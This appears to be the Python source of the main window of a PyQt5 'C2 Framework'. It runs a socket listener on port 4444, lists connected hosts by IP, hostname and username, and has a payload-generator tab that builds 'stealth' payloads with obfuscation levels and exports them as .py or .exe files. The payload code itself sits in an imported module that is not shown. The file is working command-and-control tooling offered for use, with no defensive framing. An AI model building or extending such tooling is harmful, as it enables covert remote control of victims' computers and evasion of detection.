from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLabel, QLineEdit, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox,
    QComboBox, QSpinBox, QFileDialog, QGroupBox, QFormLayout,
    QGridLayout, QCheckBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QIcon, QColor
import sys
import os
import json
import threading
import time
from datetime import datetime
import socket
import platform
import psutil
import qdarkstyle
from flask import Flask, request, jsonify
import subprocess
import tempfile
from .session_window import SessionWindow
from .payload_generator import PayloadGenerator

class ListenerThread(QThread):
    connection_received = pyqtSignal(str, dict)
    data_updated = pyqtSignal(str, dict)
    
    def __init__(self, port):
        super().__init__()
        self.port = port
        self.running = True
        self.active_connections = {}  # Store active connections
        
    def run(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', self.port))
            server.listen(5)
            
            while self.running:
                try:
                    client, addr = server.accept()
                    client_info = {
                        'ip': addr[0],
                        'port': addr[1],
                        'hostname': socket.gethostbyaddr(addr[0])[0],
                        'os': platform.system(),
                        'username': os.getlogin()
                    }
                    
                    # Check if we already have a connection from this IP
                    if addr[0] in self.active_connections:
                        # Update existing connection
                        self.data_updated.emit(str(addr), client_info)
                    else:
                        # New connection
                        self.active_connections[addr[0]] = client
                        self.connection_received.emit(str(addr), client_info)
                        
                except Exception as e:
                    print(f"Error accepting connection: {str(e)}")
                    
        except Exception as e:
            print(f"Error starting listener: {str(e)}")
            
    def stop(self):
        self.running = False
        # Close all active connections
        for client in self.active_connections.values():
            try:
                client.close()
            except:
                pass
        self.active_connections.clear()

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("C2 Framework")
        self.setMinimumSize(1200, 800)
        
        # Initialize variables
        self.active_listeners = {}
        self.active_sessions = {}
        self.session_windows = {}
        
        try:
            # Initialize payload generator
            self.payload_generator = PayloadGenerator()
        except ImportError as e:
            QMessageBox.critical(self, "Error", f"Failed to initialize: {str(e)}")
            sys.exit(1)
        
        # Create main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        
        # Create tab widget
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)
        
        # Create tabs
        self.create_listener_tab()
        self.create_payload_tab()
        self.create_sessions_tab()
        
        # Apply dark theme
        self.setStyleSheet(qdarkstyle.load_stylesheet())
        
        # Setup status bar
        self.statusBar().showMessage("Ready")
        
    def create_listener_tab(self):
        listener_widget = QWidget()
        layout = QVBoxLayout(listener_widget)
        
        # Listener controls
        controls_group = QGroupBox("Listener Controls")
        controls_layout = QGridLayout()
        
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(4444)
        
        self.start_button = QPushButton("Start Listener")
        self.start_button.clicked.connect(self.toggle_listener)
        
        controls_layout.addWidget(QLabel("Port:"), 0, 0)
        controls_layout.addWidget(self.port_input, 0, 1)
        controls_layout.addWidget(self.start_button, 0, 2)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Status area
        self.status_area = QTextEdit()
        self.status_area.setReadOnly(True)
        layout.addWidget(self.status_area)
        
        self.tabs.addTab(listener_widget, "Listeners")
        
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout(payload_tab)
        
        # Payload configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.payload_host = QLineEdit()
        self.payload_host.setPlaceholderText("Enter C2 host address")
        self.payload_port = QSpinBox()
        self.payload_port.setRange(1, 65535)
        self.payload_port.setValue(8080)
        
        self.payload_type = QComboBox()
        self.payload_type.addItems(["Python", "Executable"])
        
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems(["Low", "Medium", "High"])
        
        # Add validation
        self.payload_host.textChanged.connect(self.validate_payload_config)
        
        config_layout.addRow("Host:", self.payload_host)
        config_layout.addRow("Port:", self.payload_port)
        config_layout.addRow("Type:", self.payload_type)
        config_layout.addRow("Obfuscation:", self.obfuscation_level)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Generate button
        generate_btn = QPushButton("Generate Payload")
        generate_btn.clicked.connect(self.generate_payload)
        generate_btn.setEnabled(False)  # Disabled until valid config
        self.generate_btn = generate_btn
        layout.addWidget(generate_btn)
        
        # Payload preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        preview_layout.addWidget(self.payload_preview)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Save button
        save_btn = QPushButton("Save Payload")
        save_btn.clicked.connect(self.save_payload)
        save_btn.setEnabled(False)  # Disabled until payload generated
        self.save_btn = save_btn
        layout.addWidget(save_btn)
        
        self.tabs.addTab(payload_tab, "Payload Generator")
        
    def create_sessions_tab(self):
        sessions_widget = QWidget()
        layout = QVBoxLayout(sessions_widget)
        
        # Sessions table with improved styling
        self.sessions_table = QTableWidget()
        self.sessions_table.setColumnCount(6)
        self.sessions_table.setHorizontalHeaderLabels([
            "ID", "IP", "Hostname", "OS", "Username", "Status"
        ])
        self.sessions_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.sessions_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.sessions_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.sessions_table.setAlternatingRowColors(True)
        self.sessions_table.setStyleSheet("""
            QTableWidget {
                border: 1px solid #3a3a3a;
                border-radius: 4px;
                background-color: #2b2b2b;
                gridline-color: #3a3a3a;
            }
            QTableWidget::item {
                padding: 5px;
                color: #ffffff;
            }
            QTableWidget::item:selected {
                background-color: #0d47a1;
            }
            QHeaderView::section {
                background-color: #1e1e1e;
                color: #ffffff;
                padding: 5px;
                border: 1px solid #3a3a3a;
            }
        """)
        
        # Session controls
        controls_layout = QHBoxLayout()
        
        # View button
        self.view_session_btn = QPushButton("View Session")
        self.view_session_btn.setStyleSheet("""
            QPushButton {
                background-color: #0d47a1;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #1565c0;
            }
            QPushButton:disabled {
                background-color: #424242;
            }
        """)
        self.view_session_btn.clicked.connect(self.open_selected_session)
        self.view_session_btn.setEnabled(False)
        
        # Remove button
        self.remove_session_btn = QPushButton("Remove Session")
        self.remove_session_btn.setStyleSheet("""
            QPushButton {
                background-color: #b71c1c;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #c62828;
            }
            QPushButton:disabled {
                background-color: #424242;
            }
        """)
        self.remove_session_btn.clicked.connect(self.remove_selected_session)
        self.remove_session_btn.setEnabled(False)
        
        controls_layout.addWidget(self.view_session_btn)
        controls_layout.addWidget(self.remove_session_btn)
        controls_layout.addStretch()
        
        # Connect selection changed signal
        self.sessions_table.itemSelectionChanged.connect(self.on_session_selection_changed)
        
        layout.addWidget(self.sessions_table)
        layout.addLayout(controls_layout)
        
        self.tabs.addTab(sessions_widget, "Sessions")
        
    def on_session_selection_changed(self):
        has_selection = len(self.sessions_table.selectedItems()) > 0
        self.view_session_btn.setEnabled(has_selection)
        self.remove_session_btn.setEnabled(has_selection)
        
    def open_selected_session(self):
        selected_items = self.sessions_table.selectedItems()
        if not selected_items:
            return
            
        row = selected_items[0].row()
        session_id = self.sessions_table.item(row, 0).text()
        
        if session_id in self.active_sessions:
            if session_id not in self.session_windows:
                session_window = SessionWindow(session_id, self.active_sessions[session_id])
                self.session_windows[session_id] = session_window
            self.session_windows[session_id].show()
            self.session_windows[session_id].raise_()
            self.statusBar().showMessage(f"Opened session: {session_id}")
            
    def remove_selected_session(self):
        selected_items = self.sessions_table.selectedItems()
        if not selected_items:
            return
            
        row = selected_items[0].row()
        session_id = self.sessions_table.item(row, 0).text()
        
        reply = QMessageBox.question(
            self,
            "Confirm Removal",
            f"Are you sure you want to remove session {session_id}?",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            if session_id in self.session_windows:
                self.session_windows[session_id].close()
                del self.session_windows[session_id]
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]
            self.update_sessions_table()
            self.statusBar().showMessage(f"Removed session: {session_id}")
            
    def update_sessions_table(self):
        self.sessions_table.setRowCount(len(self.active_sessions))
        for i, (session_id, info) in enumerate(self.active_sessions.items()):
            self.sessions_table.setItem(i, 0, QTableWidgetItem(session_id))
            self.sessions_table.setItem(i, 1, QTableWidgetItem(info['ip']))
            self.sessions_table.setItem(i, 2, QTableWidgetItem(info.get('hostname', 'Unknown')))
            self.sessions_table.setItem(i, 3, QTableWidgetItem(info.get('os', 'Unknown')))
            self.sessions_table.setItem(i, 4, QTableWidgetItem(info.get('username', 'Unknown')))
            self.sessions_table.setItem(i, 5, QTableWidgetItem("Active"))
            
    def handle_connection(self, session_id, client_info):
        self.status_area.append(f"New connection from {client_info['ip']}")
        
        # Only add to active sessions, don't create window automatically
        self.active_sessions[session_id] = client_info
        self.update_sessions_table()
        self.statusBar().showMessage(f"New session available: {session_id}")
        
    def handle_data_update(self, session_id, client_info):
        # Update existing session info
        if session_id in self.active_sessions:
            self.active_sessions[session_id].update(client_info)
            self.update_sessions_table()
            # Only update status bar if window is open
            if session_id in self.session_windows:
                self.statusBar().showMessage(f"Updated session: {session_id}")
            
    def toggle_listener(self):
        if not hasattr(self, 'listener_thread') or not self.listener_thread.isRunning():
            # Start listener
            port = self.port_input.value()
            self.listener_thread = ListenerThread(port)
            self.listener_thread.connection_received.connect(self.handle_connection)
            self.listener_thread.data_updated.connect(self.handle_data_update)
            self.listener_thread.start()
            
            self.start_button.setText("Stop Listener")
            self.status_area.append(f"Started listener on port {port}")
        else:
            # Stop listener
            self.listener_thread.stop()
            self.listener_thread.wait()
            
            self.start_button.setText("Start Listener")
            self.status_area.append("Stopped listener")
            
    def validate_payload_config(self):
        host = self.payload_host.text()
        is_valid = bool(host and host.strip())
        self.generate_btn.setEnabled(is_valid)
        if not is_valid:
            self.statusBar().showMessage("Please enter a valid host address")
        else:
            self.statusBar().showMessage("Ready to generate payload")
            
    def generate_payload(self):
        try:
            host = self.payload_host.text()
            port = self.payload_port.value()
            
            if not host:
                QMessageBox.warning(self, "Error", "Please enter a host address")
                return
                
            # Generate payload
            self.statusBar().showMessage("Generating payload...")
            payload = self.payload_generator.generate_stealth_payload(host, port)
            
            # Set obfuscation level
            if self.obfuscation_level.currentText() == "High":
                # Add more obfuscation
                payload = self.payload_generator.obfuscate_payload(payload)
            
            # Show preview
            self.payload_preview.setText(payload)
            self.save_btn.setEnabled(True)
            self.statusBar().showMessage("Payload generated successfully")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate payload: {str(e)}")
            self.statusBar().showMessage("Failed to generate payload")
            
    def save_payload(self):
        try:
            payload = self.payload_preview.toPlainText()
            if not payload:
                return
                
            file_path, _ = QFileDialog.getSaveFileName(
                self,
                "Save Payload",
                "",
                "Python Files (*.py);;Executable Files (*.exe)"
            )
            
            if file_path:
                self.statusBar().showMessage("Saving payload...")
                
                if file_path.endswith('.exe'):
                    # Generate executable
                    if self.payload_generator.generate_exe(payload, file_path):
                        QMessageBox.information(self, "Success", "Executable generated successfully")
                        self.statusBar().showMessage("Executable generated successfully")
                    else:
                        QMessageBox.warning(self, "Error", "Failed to generate executable")
                        self.statusBar().showMessage("Failed to generate executable")
                else:
                    # Save Python script
                    with open(file_path, 'w') as f:
                        f.write(payload)
                    QMessageBox.information(self, "Success", "Payload saved successfully")
                    self.statusBar().showMessage("Payload saved successfully")
                    
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save payload: {str(e)}")
            self.statusBar().showMessage("Failed to save payload")
            
    def closeEvent(self, event):
        try:
            # Clean up resources
            if hasattr(self, 'listener_thread') and self.listener_thread.isRunning():
                self.listener_thread.stop()
                self.listener_thread.wait()
            for window in self.session_windows.values():
                window.close()
            event.accept()
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Error during cleanup: {str(e)}")
            event.accept()

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec()) 